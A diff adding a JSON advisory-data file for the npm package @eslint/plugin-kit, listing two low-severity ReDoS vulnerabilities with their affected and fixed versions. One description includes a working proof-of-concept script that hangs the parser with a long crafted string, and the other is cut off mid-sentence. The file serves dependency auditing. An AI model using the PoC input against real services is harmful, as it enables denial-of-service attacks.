@@ -1,0 +1,44 @@
+{
+  "name": "@eslint/plugin-kit",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-xffm-g5w8-qvg7",
+      "title": "@eslint/plugin-kit is vulnerable to Regular Expression Denial of Service attacks through ConfigCommentParser",
+      "description": "### Summary\n\nThe `ConfigCommentParser#parseJSONLikeConfig` API is vulnerable to a Regular Expression Denial of Service (ReDoS) attack in its only argument.\n\n### Details\n\nThe regular expression at [packages/plugin-kit/src/config-comment-parser.js:158](https://github.com/eslint/rewrite/blob/bd4bf23c59f0e4886df671cdebd5abaeb1e0d916/packages/plugin-kit/src/config-comment-parser.js#L158) is vulnerable to a quadratic runtime attack because the grouped expression is not anchored. This can be solved by ",
+      "severity": "low",
+      "url": "https://github.com/advisories/GHSA-xffm-g5w8-qvg7",
+      "publishedAt": "2025-07-18T20:39:12Z",
+      "modifiedAt": "2025-07-28T17:34:45Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-xffm-g5w8-qvg7"
+        }
+      ],
+      "affectedRange": "< 0.3.4",
+      "fixedVersion": "0.3.4"
+    },
+    {
+      "id": "GHSA-7q7g-4xm8-89cq",
+      "title": "Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit",
+      "description": "Crafting a very large and well crafted string can increase the CPU usage and crash the program.\n\n## POC\n\n```js\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nvar str = \"\";\nfor (var i = 0; i < 1000000; i++) {\n  str += \" \";\n}\nstr += \"A\";\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseStringConfig(str, \"\"));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit` and `node attack.js` \n// then the program will stuck forever with high CPU usage\n``",
+      "severity": "low",
+      "url": "https://github.com/advisories/GHSA-7q7g-4xm8-89cq",
+      "publishedAt": "2024-11-15T20:47:31Z",
+      "modifiedAt": "2024-11-19T20:49:58Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-7q7g-4xm8-89cq"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2024-21539"
+        }
+      ],
+      "affectedRange": "< 0.2.3",
+      "fixedVersion": "0.2.3"
+    }
+  ]
+}
